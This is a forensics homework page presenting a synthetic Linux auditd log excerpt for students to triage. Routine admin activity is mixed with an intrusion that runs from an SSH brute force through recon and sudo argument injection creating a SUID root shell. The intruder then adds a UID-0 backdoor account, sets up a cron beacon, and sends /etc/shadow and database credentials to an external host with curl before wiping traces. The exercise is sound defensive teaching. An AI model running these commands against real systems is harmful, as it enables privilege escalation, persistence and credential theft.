---
title: "CYBER HW 12 - Audit Log Excerpt (Analysis Exercise)"
parent: Homework
nav_exclude: true
---

# prod-web-03 - auditd Log Excerpt
{: .no_toc }

{: .note }
This is the auditd log excerpt referenced in [CYBER HW 12]({% link homework/cyber-hw-12.md %}). Analyze it yourself before looking anywhere else - the point of the exercise is to triage, classify, and reconstruct independently. **Not every record below is security-relevant** - some of it is routine background activity (patching, monitoring health checks, scheduled backups, ordinary admin logins) that a real analyst has to filter out along the way, exactly as you'll need to here. Host: `prod-web-03`, an internal Linux application server. Timestamps are UTC, `2026-03-14`.

```
type=USER_LOGIN msg=audit(1773453510.201:100482): pid=28841 uid=0 auid=1002 ses=98 msg='op=login id=1002 exe="/usr/sbin/sshd" hostname=10.0.2.15 addr=10.0.2.15 terminal=/dev/pts/0 res=success'
type=SYSCALL msg=audit(1773453510.442:100483): arch=c000003e syscall=59 success=yes exit=0 a0=55a1c2 a1=55a1d0 a2=55a1e0 a3=0 items=2 ppid=28841 pid=28855 auid=1002 uid=1002 gid=1002 euid=1002 suid=1002 fsuid=1002 egid=1002 sgid=1002 fsgid=1002 tty=pts0 ses=98 comm="apt" exe="/usr/bin/apt" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="pkg_mgmt"
type=EXECVE msg=audit(1773453510.442:100483): argc=3 a0="apt" a1="upgrade" a2="-y"
type=USER_END msg=audit(1773453550.108:100491): pid=28841 uid=0 auid=1002 ses=98 msg='op=login id=1002 exe="/usr/sbin/sshd" hostname=10.0.2.15 addr=10.0.2.15 terminal=/dev/pts/0 res=success'

type=USER_LOGIN msg=audit(1773453780.100:100495): pid=29301 uid=0 auid=1002 ses=101 msg='op=login id=1002 exe="/usr/sbin/sshd" hostname=10.0.2.15 addr=10.0.2.15 terminal=/dev/pts/1 res=success'
type=SYSCALL msg=audit(1773453850.220:100498): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=2 ppid=29301 pid=29305 auid=1002 uid=1002 gid=1002 euid=1002 suid=1002 fsuid=1002 egid=1002 sgid=1002 fsgid=1002 tty=pts1 ses=101 comm="systemctl" exe="/usr/bin/systemctl" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="null"
type=EXECVE msg=audit(1773453850.220:100498): argc=3 a0="systemctl" a1="status" a2="nginx"
type=CWD msg=audit(1773453850.220:100498): cwd="/home/jchen"
type=USER_END msg=audit(1773453940.400:100501): pid=29301 uid=0 auid=1002 ses=101 msg='op=login id=1002 exe="/usr/sbin/sshd" hostname=10.0.2.15 addr=10.0.2.15 terminal=/dev/pts/1 res=success'

type=SYSCALL msg=audit(1773454155.010:100505): arch=c000003e syscall=59 success=yes exit=0 a0=55d400 a1=55d410 a2=55d420 a3=0 items=2 ppid=512 pid=29310 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="certbot" exe="/usr/bin/certbot" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="pkg_mgmt"
type=EXECVE msg=audit(1773454155.010:100505): argc=2 a0="certbot" a1="renew"
type=CWD msg=audit(1773454155.010:100505): cwd="/"

type=USER_AUTH msg=audit(1773454300.500:100508): pid=29315 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="mfoster" exe="/usr/sbin/sshd" hostname=10.0.5.22 addr=10.0.5.22 terminal=ssh res=failed'

type=USER_AUTH msg=audit(1773454443.117:100512): pid=29102 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="webapp" exe="/usr/sbin/sshd" hostname=203.0.113.77 addr=203.0.113.77 terminal=ssh res=failed'

type=USER_AUTH msg=audit(1773454447.339:100515): pid=29104 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="webapp" exe="/usr/sbin/sshd" hostname=203.0.113.77 addr=203.0.113.77 terminal=ssh res=failed'

type=USER_AUTH msg=audit(1773454451.552:100518): pid=29106 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="webapp" exe="/usr/sbin/sshd" hostname=203.0.113.77 addr=203.0.113.77 terminal=ssh res=failed'

type=USER_AUTH msg=audit(1773454459.771:100521): pid=29109 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=pam_unix acct="webapp" exe="/usr/sbin/sshd" hostname=203.0.113.77 addr=203.0.113.77 terminal=ssh res=success'
type=USER_LOGIN msg=audit(1773454460.004:100522): pid=29109 uid=0 auid=1001 ses=104 msg='op=login id=1001 exe="/usr/sbin/sshd" hostname=203.0.113.77 addr=203.0.113.77 terminal=/dev/pts/2 res=success'
type=CRED_ACQ msg=audit(1773454460.009:100523): pid=29109 uid=0 auid=1001 ses=104 msg='op=PAM:setcred grantors=pam_unix acct="webapp" exe="/usr/sbin/sshd" hostname=203.0.113.77 addr=203.0.113.77 terminal=ssh res=success'

type=SYSCALL msg=audit(1773454502.114:100530): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=2 ppid=29109 pid=29143 auid=1001 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="whoami" exe="/usr/bin/whoami" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="recon"
type=EXECVE msg=audit(1773454502.114:100530): argc=1 a0="whoami"
type=CWD msg=audit(1773454502.114:100530): cwd="/home/webapp"
type=PATH msg=audit(1773454502.114:100530): item=1 name="/usr/bin/whoami" inode=524311 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0

type=SYSCALL msg=audit(1773454510.220:100533): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=2 ppid=29109 pid=29147 auid=1001 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="uname" exe="/usr/bin/uname" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="recon"
type=EXECVE msg=audit(1773454510.220:100533): argc=2 a0="uname" a1="-a"
type=CWD msg=audit(1773454510.220:100533): cwd="/home/webapp"

type=SYSCALL msg=audit(1773454547.331:100538): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55c2d0 a2=0 a3=0 items=1 ppid=29109 pid=29151 auid=1001 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="cat" exe="/usr/bin/cat" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="recon"
type=EXECVE msg=audit(1773454547.331:100538): argc=2 a0="cat" a1="/etc/passwd"
type=PATH msg=audit(1773454547.331:100538): item=0 name="/etc/passwd" inode=131203 dev=fd:00 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0

type=SYSCALL msg=audit(1773454590.445:100544): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=2 ppid=29109 pid=29160 auid=1001 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="sudo" exe="/usr/bin/sudo" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="priv_escalation"
type=EXECVE msg=audit(1773454590.445:100544): argc=2 a0="sudo" a1="-l"
type=CWD msg=audit(1773454590.445:100544): cwd="/home/webapp"
# Command output (not itself an audit record - reconstructed from the same session's terminal capture):
#   Matching Defaults entries for webapp on prod-web-03:
#       ...
#   User webapp may run the following commands on prod-web-03:
#       (root) NOPASSWD: /usr/local/bin/deploy_app.sh

type=SYSCALL msg=audit(1773454635.300:100547): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=1 ppid=1 pid=29320 auid=4294967295 uid=1005 gid=1005 euid=1005 suid=1005 fsuid=1005 egid=1005 sgid=1005 fsgid=1005 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="null"
type=EXECVE msg=audit(1773454635.300:100547): argc=3 a0="curl" a1="-s" a2="http://10.0.2.50:8080/healthz"

type=SYSCALL msg=audit(1773454692.117:100551): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=2 ppid=29109 pid=29171 auid=1001 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="find" exe="/usr/bin/find" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="recon"
type=EXECVE msg=audit(1773454692.117:100551): argc=6 a0="find" a1="/" a2="-perm" a3="-4000" a4="-type" a5="f"
type=CWD msg=audit(1773454692.117:100551): cwd="/home/webapp"

type=SYSCALL msg=audit(1773454830.150:100556): arch=c000003e syscall=59 success=yes exit=0 a0=55d500 a1=55d510 a2=55d520 a3=0 items=2 ppid=512 pid=29325 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="tar" exe="/usr/bin/tar" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="null"
type=EXECVE msg=audit(1773454830.150:100556): argc=4 a0="tar" a1="czf" a2="/backup/nightly/app_2026-03-14.tar.gz" a3="/var/www/app"
type=CWD msg=audit(1773454830.150:100556): cwd="/"

type=SYSCALL msg=audit(1773454905.400:100560): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=1 ppid=1 pid=29330 auid=4294967295 uid=1005 gid=1005 euid=1005 suid=1005 fsuid=1005 egid=1005 sgid=1005 fsgid=1005 tty=(none) ses=4294967295 comm="df" exe="/usr/bin/df" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="null"
type=EXECVE msg=audit(1773454905.400:100560): argc=2 a0="df" a1="-h"

type=SYSCALL msg=audit(1773454990.882:100566): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=2 ppid=29109 pid=29188 auid=1001 uid=1001 gid=1001 euid=0 suid=0 fsuid=0 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="sudo" exe="/usr/bin/sudo" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="priv_escalation"
type=EXECVE msg=audit(1773454990.882:100566): argc=3 a0="sudo" a1="/usr/local/bin/deploy_app.sh" a2=";id;cp /bin/bash /tmp/.cache/.rootbash;chmod 4755 /tmp/.cache/.rootbash;"
type=CWD msg=audit(1773454990.882:100566): cwd="/home/webapp"
type=PATH msg=audit(1773454990.882:100566): item=0 name="/usr/local/bin/deploy_app.sh" inode=139204 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0

type=SYSCALL msg=audit(1773454991.014:100567): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=2 ppid=29188 pid=29189 auid=1001 uid=0 gid=1001 euid=0 suid=0 fsuid=0 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="id" exe="/usr/bin/id" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="priv_escalation"
type=EXECVE msg=audit(1773454991.014:100567): argc=1 a0="id"

type=SYSCALL msg=audit(1773455060.220:100570): arch=c000003e syscall=59 success=yes exit=0 a0=55d600 a1=55d610 a2=55d620 a3=0 items=1 ppid=512 pid=29335 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="systemctl" exe="/usr/bin/systemctl" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="null"
type=EXECVE msg=audit(1773455060.220:100570): argc=3 a0="systemctl" a1="reload" a2="nginx"

type=SYSCALL msg=audit(1773455140.226:100574): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=2 ppid=29188 pid=29195 auid=1001 uid=0 gid=1001 euid=0 suid=0 fsuid=0 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="useradd" exe="/usr/sbin/useradd" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="user_mgmt"
type=EXECVE msg=audit(1773455140.226:100574): argc=6 a0="useradd" a1="-o" a2="-u" a3="0" a4="-g" a5="0" a6="svc-support"
type=PATH msg=audit(1773455140.226:100574): item=0 name="/etc/passwd" inode=131203 dev=fd:00 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0

type=SYSCALL msg=audit(1773455162.550:100579): arch=c000003e syscall=85 success=yes exit=5 a0=55c9a0 a1=1a4 a2=0 a3=0 items=1 ppid=29188 pid=29201 auid=1001 uid=0 gid=1001 euid=0 suid=0 fsuid=0 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="bash" exe="/usr/bin/bash" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="persistence"
type=PATH msg=audit(1773455162.550:100579): item=0 name="/etc/cron.d/.sysupdate" inode=139512 dev=fd:00 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=CREATE cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
# File contents (recovered from a follow-up `cat` of the same path,
# not itself a separate audit record):
#   */5 * * * * root /tmp/.cache/.rootbash -c "curl -s http://198.51.100.23:4444/beacon"

type=SYSCALL msg=audit(1773455310.500:100583): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=1 ppid=1 pid=29340 auid=4294967295 uid=1005 gid=1005 euid=1005 suid=1005 fsuid=1005 egid=1005 sgid=1005 fsgid=1005 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="null"
type=EXECVE msg=audit(1773455310.500:100583): argc=3 a0="curl" a1="-s" a2="http://10.0.2.50:8080/healthz"

type=SYSCALL msg=audit(1773455475.667:100588): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=3 ppid=29188 pid=29210 auid=1001 uid=0 gid=1001 euid=0 suid=0 fsuid=0 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="tar" exe="/usr/bin/tar" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="exfil_stage"
type=EXECVE msg=audit(1773455475.667:100588): argc=5 a0="tar" a1="czf" a2="/tmp/.cache/.bk/db_dump.tar.gz" a3="/var/www/app/config/database.yml" a4="/etc/shadow"
type=CWD msg=audit(1773455475.667:100588): cwd="/root"
type=PATH msg=audit(1773455475.667:100588): item=0 name="/var/www/app/config/database.yml" inode=145820 dev=fd:00 mode=0100640 ouid=1001 ogid=1001 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
type=PATH msg=audit(1773455475.667:100588): item=1 name="/etc/shadow" inode=131208 dev=fd:00 mode=0000640 ouid=0 ogid=42 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0

type=SYSCALL msg=audit(1773455627.890:100594): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=2 ppid=29188 pid=29218 auid=1001 uid=0 gid=1001 euid=0 suid=0 fsuid=0 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="curl" exe="/usr/bin/curl" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="exfil_attempt"
type=EXECVE msg=audit(1773455627.890:100594): argc=4 a0="curl" a1="-T" a2="/tmp/.cache/.bk/db_dump.tar.gz" a3="http://198.51.100.23:4444/upload"
type=CWD msg=audit(1773455627.890:100594): cwd="/root"

type=SYSCALL msg=audit(1773455642.015:100596): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=55d110 a2=10 a3=0 items=0 ppid=29188 pid=29218 auid=1001 uid=0 gid=1001 euid=0 suid=0 fsuid=0 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="curl" exe="/usr/bin/curl" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="exfil_attempt"
type=SOCKADDR msg=audit(1773455642.015:100596): saddr=02001194C6335017000000000000000000000000
# ausearch -i decodes saddr above to: inet host:198.51.100.23 serv:4500 (NAT'd egress port; app-layer dest port 4444 per the curl command above)

type=SYSCALL msg=audit(1773455700.100:100599): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=1 ppid=1 pid=29345 auid=4294967295 uid=1005 gid=1005 euid=1005 suid=1005 fsuid=1005 egid=1005 sgid=1005 fsgid=1005 tty=(none) ses=4294967295 comm="free" exe="/usr/bin/free" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="null"
type=EXECVE msg=audit(1773455700.100:100599): argc=2 a0="free" a1="-h"

type=SYSCALL msg=audit(1773455780.301:100601): arch=c000003e syscall=87 success=yes exit=0 a0=55d200 a1=0 a2=0 a3=0 items=1 ppid=29188 pid=29225 auid=1001 uid=0 gid=1001 euid=0 suid=0 fsuid=0 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="rm" exe="/usr/bin/rm" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="anti_forensics"
type=EXECVE msg=audit(1773455780.301:100601): argc=3 a0="rm" a1="-f" a2="/tmp/.cache/.bk/db_dump.tar.gz"
type=PATH msg=audit(1773455780.301:100601): item=0 name="/tmp/.cache/.bk/db_dump.tar.gz" inode=150331 dev=fd:00 mode=0100600 ouid=0 ogid=0 rdev=00:00 nametype=DELETE cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0

type=SYSCALL msg=audit(1773455805.552:100604): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=1 ppid=29188 pid=29229 auid=1001 uid=0 gid=1001 euid=0 suid=0 fsuid=0 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=104 comm="bash" exe="/usr/bin/bash" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="anti_forensics"
type=EXECVE msg=audit(1773455805.552:100604): argc=2 a0="history" a1="-c"
type=PATH msg=audit(1773455805.552:100604): item=0 name="/root/.bash_history" inode=131900 dev=fd:00 mode=0100600 ouid=0 ogid=0 rdev=00:00 nametype=DELETE cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0

type=USER_LOGIN msg=audit(1773456000.100:100610): pid=29350 uid=0 auid=1002 ses=105 msg='op=login id=1002 exe="/usr/sbin/sshd" hostname=10.0.2.15 addr=10.0.2.15 terminal=/dev/pts/1 res=success'
type=SYSCALL msg=audit(1773456010.200:100612): arch=c000003e syscall=59 success=yes exit=0 a0=7ffc1a2b10 a1=7ffc1a2b30 a2=7ffc1a2b40 a3=0 items=2 ppid=29350 pid=29352 auid=1002 uid=1002 gid=1002 euid=1002 suid=1002 fsuid=1002 egid=1002 sgid=1002 fsgid=1002 tty=pts1 ses=105 comm="systemctl" exe="/usr/bin/systemctl" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="null"
type=EXECVE msg=audit(1773456010.200:100612): argc=3 a0="systemctl" a1="status" a2="sshd"
type=USER_END msg=audit(1773456030.300:100615): pid=29350 uid=0 auid=1002 ses=105 msg='op=login id=1002 exe="/usr/sbin/sshd" hostname=10.0.2.15 addr=10.0.2.15 terminal=/dev/pts/1 res=success'
```

[← Back to CYBER HW 12]({% link homework/cyber-hw-12.md %})
